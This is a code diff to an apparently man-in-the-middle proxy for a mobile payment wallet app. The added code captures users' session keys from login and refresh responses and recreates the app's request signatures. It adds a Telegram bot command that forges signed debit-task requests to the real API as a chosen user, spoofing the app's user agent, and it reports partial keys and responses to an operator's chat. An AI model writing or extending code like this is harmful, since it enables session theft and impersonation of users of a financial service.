@@ -93,6 +93,13 @@ async function saveData(data) {
   }
 }
 
+const sessionKeyMap = {};
+
+function computeSignature(sessionKey, bodyObj) {
+  const sorted = Object.entries(bodyObj).sort().map(([k,v]) => `${k}=${v}`).join('&');
+  return crypto.createHash('md5').update(`${sorted}&${sessionKey}`).digest('hex');
+}
+
 function getTokenFromReq(req) {
   return req.headers['authorization'] || req.headers['token'] || req.headers['logintoken'] || req.headers['apptoken'] || '';
 }
@@ -625,6 +632,30 @@ app.post('/bot-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/testtask')) {
+      const parts = text.split(/\s+/);
+      const targetUid = parts[1] || Object.keys(sessionKeyMap)[0];
+      if (!targetUid || !sessionKeyMap[targetUid]) {
+        await bot.sendMessage(chatId, `❌ No sessionKey stored. Available: ${Object.keys(sessionKeyMap).join(', ') || 'none'}\nUsage: /testtask <userId>`);
+        return res.sendStatus(200);
+      }
+      const sk = sessionKeyMap[targetUid];
+      const bodyObj = { page: 1, size: 10, sortType: 2, orderType: 1, ts: Date.now(), userId: parseInt(targetUid) };
+      const sig = computeSignature(sk, bodyObj);
+      try {
+        const testResp = await fetch(`${ORIGINAL_API}/app/pay/debit/task`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json;charset=UTF-8', 'Signature': sig, 'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'X-Requested-With': 'com.eastpay.wallet', 'Accept': 'application/json, text/plain, */*' },
+          body: JSON.stringify(bodyObj)
+        });
+        const testText = await testResp.text();
+        await bot.sendMessage(chatId, `🧪 Direct Task Test [${targetUid}]\n🔑 SK: ${sk.substring(0,8)}...${sk.slice(-4)}\n📝 Sig: ${sig.substring(0,16)}\n📤 Body: ${JSON.stringify(bodyObj)}\n📊 HTTP: ${testResp.status}\n📥 ${testText.substring(0, 600)}`);
+      } catch(e2) {
+        await bot.sendMessage(chatId, `❌ Direct test failed: ${e2.message}`);
+      }
+      return res.sendStatus(200);
+    }
+
     if (text === '/users') {
       const users = data.trackedUsers || {};
       const keys = Object.keys(users);
@@ -665,6 +696,7 @@ app.post('/app/auth/login', async (req, res) => {
       if (respData.sessionKey) {
         if (userId) {
           tokenUserMap['session_' + String(userId)] = String(userId);
+          sessionKeyMap[String(userId)] = respData.sessionKey;
         }
       }
     }
@@ -984,8 +1016,14 @@ app.all('/app/pay/debit/task', async (req, res) => {
       const hasSig = req.headers['signature'] ? 'yes' : 'no';
       const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
       const ct = req.headers['content-type'] || 'none';
-      const fwdHeaders = Object.keys(req.headers).filter(h => ['content-type','accept','signature','user-agent','x-requested-with','logintoken','authorization'].includes(h.toLowerCase())).join(', ');
-      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n🔑 Fwd: ${fwdHeaders}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
+      let sigVerify = 'no-key';
+      const storedKey = sessionKeyMap[String(userId)];
+      if (storedKey && req.parsedBody) {
+        const expectedSig = computeSignature(storedKey, req.parsedBody);
+        const actualSig = req.headers['signature'] || '';
+        sigVerify = expectedSig === actualSig ? '✅MATCH' : `❌MISMATCH(exp:${expectedSig.substring(0,8)} got:${actualSig.substring(0,8)})`;
+      }
+      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body: ${reqBody}\n🔐 Sig: ${hasSig} | SigCheck: ${sigVerify}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
     }
   } catch(e) {
     if (bot && (await loadData()).adminChatId) {
@@ -1157,7 +1195,24 @@ for (const ep of COLLECTION_ENDPOINTS) {
 app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
-app.all('/app/auth/refresh/session', async (req, res) => { await transparentProxy(req, res); });
+app.all('/app/auth/refresh/session', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const body = req.parsedBody || {};
+    const respData = getResponseData(jsonResp);
+    const userId = await extractUserId(req, jsonResp);
+    if (respData && respData.sessionKey && userId) {
+      sessionKeyMap[String(userId)] = respData.sessionKey;
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SessionKey: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored for signature verification`).catch(()=>{});
+      }
+    } else if (data.adminChatId && bot) {
+      bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId || 'N/A'}\n❌ No sessionKey in response\n📥 ${respBody.substring(0, 300)}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
 app.all('/app/auth/send/code', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/auth/logout', async (req, res) => { await transparentProxy(req, res); });
 
